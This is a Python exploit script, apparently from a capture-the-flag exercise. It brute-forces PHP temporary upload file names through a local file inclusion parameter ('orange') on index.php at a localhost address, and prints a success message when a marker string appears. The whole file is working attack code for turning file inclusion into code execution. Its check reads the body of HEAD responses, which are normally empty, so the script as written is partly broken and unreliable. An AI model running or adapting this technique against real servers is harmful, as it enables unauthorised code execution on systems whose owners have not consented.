#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

charset = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890"

host = "127.0.0.1"
port = 8002
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                    for m in charset:
                        for n in charset:
                            filename = i + j + k + l + m + n
                            url = "%s/index.php?orange=/tmp/php%s" % (
                                base_url, filename)
                            try:
                                response = requests.head(url)
                                if b'virink' in response.content:
                                    print("[+] Include success!")
                                    return True
                            except Exception as e:
                                print(e)
    return False


def main():
    brute_force_tmp_files()


if __name__ == "__main__":
    main()
